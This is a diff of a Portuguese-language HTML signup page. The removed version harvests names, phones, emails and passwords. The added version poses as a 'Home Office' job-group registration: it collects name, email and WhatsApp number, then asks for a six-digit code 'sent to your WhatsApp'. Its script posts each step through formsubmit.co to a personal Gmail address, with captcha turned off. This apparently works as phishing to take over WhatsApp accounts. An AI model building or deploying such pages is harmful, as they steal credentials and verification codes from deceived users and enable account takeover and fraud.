@@ -1,121 +1,110 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Cadastro - BotzillaX</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cadastro Home Office</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      background: #f4f4f4;
       padding: 30px;
-      min-height: 100vh;
-      margin: 0;
     }
-
-    h2 {
-      margin-bottom: 20px;
-      color: #333;
-    }
-
-    form, .final {
-      background: #fff;
+    .form-container {
+      background: white;
       padding: 25px;
-      border-radius: 10px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.1);
-      width: 100%;
       max-width: 400px;
-      display: flex;
-      flex-direction: column;
+      margin: auto;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-
-    input {
-      margin-bottom: 15px;
-      padding: 12px;
+    h2 {
+      margin-bottom: 10px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 5px;
       border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 15px;
-    }
-
-    button {
-      padding: 12px;
-      background: #3a86ff;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
       font-size: 16px;
+    }
+    button {
+      background: #4CAF50;
+      color: white;
+      border: none;
       cursor: pointer;
     }
-
-    button:hover {
-      background: #265dd8;
-    }
-
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #3a86ff;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin: 30px auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .final {
+    .hidden {
       display: none;
-      text-align: center;
-    }
-
-    .final h3 {
-      color: green;
     }
   </style>
 </head>
 <body>
 
-  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" id="formulario">
-    <h2>Cadastro VIP - BotzillaX</h2>
-    <input type="text" name="nome" placeholder="Nome completo" required>
-    <input type="tel" name="telefone" placeholder="Telefone" required>
-    <input type="email" name="email" placeholder="E-mail" required>
-    <input type="password" name="senha" placeholder="Senha" required>
-    <input type="password" name="confirmar_senha" placeholder="Confirmar senha" required>
+  <div class="form-container">
 
-    <!-- Configurações do FormSubmit -->
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_template" value="table">
-    <input type="hidden" name="_next" value="https://botzillax.com/sucesso.html">
+    <!-- Etapa 1 -->
+    <div id="etapa1">
+      <h2>Entre para o grupo de Home Office</h2>
+      <p>Preencha com seus dados para participar:</p>
+      <form id="form1">
+        <input type="text" name="nome" placeholder="Seu nome" required>
+        <input type="email" name="email" placeholder="Seu e-mail" required>
+        <input type="text" name="whatsapp" placeholder="Seu WhatsApp" required>
+        <button type="submit">Avançar</button>
+      </form>
+    </div>
 
-    <button type="submit">Cadastrar</button>
-  </form>
+    <!-- Etapa 2 -->
+    <div id="etapa2" class="hidden">
+      <h2>Confirme sua Participação</h2>
+      <p>Digite o código de 6 dígitos enviado ao seu WhatsApp:</p>
+      <form id="form2">
+        <input type="text" name="codigo" maxlength="6" placeholder="Código" required>
+        <button type="submit">Confirmar Código</button>
+      </form>
+    </div>
 
-  <div class="final" id="final">
-    <div class="loader"></div>
-    <p id="mensagem">Processando seus dados...</p>
+    <!-- Mensagem final -->
+    <div id="sucesso" class="hidden">
+      <h2>Cadastro Concluído!</h2>
+      <p>Obrigado por confirmar sua participação.</p>
+    </div>
+
   </div>
 
   <script>
-    const form = document.getElementById("formulario");
-    const final = document.getElementById("final");
+    // Etapa 1 - envio de nome, email e WhatsApp
+    document.getElementById('form1').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      formData.append('_captcha', 'false');
+      formData.append('_subject', 'Novo interessado - Página 1');
 
-    form.addEventListener("submit", function () {
-      form.style.display = "none";
-      final.style.display = "flex";
-      document.getElementById("mensagem").innerText = "Processando seus dados...";
+      fetch('https://formsubmit.co/natanaelverissimo34@gmail.com', {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        document.getElementById('etapa1').classList.add('hidden');
+        document.getElementById('etapa2').classList.remove('hidden');
+      });
+    });
 
-      setTimeout(() => {
-        document.querySelector(".loader").style.display = "none";
-        document.getElementById("mensagem").innerHTML = "<h3>Cadastro realizado com sucesso!</h3>Um de nossos atendentes irá entrar em contato.";
-      }, 3000);
+    // Etapa 2 - envio do código
+    document.getElementById('form2').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      formData.append('_captcha', 'false');
+      formData.append('_subject', 'Código de Confirmação - Página 2');
+
+      fetch('https://formsubmit.co/natanaelverissimo34@gmail.com', {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        document.getElementById('etapa2').classList.add('hidden');
+        document.getElementById('sucesso').classList.remove('hidden');
+      });
     });
   </script>
 
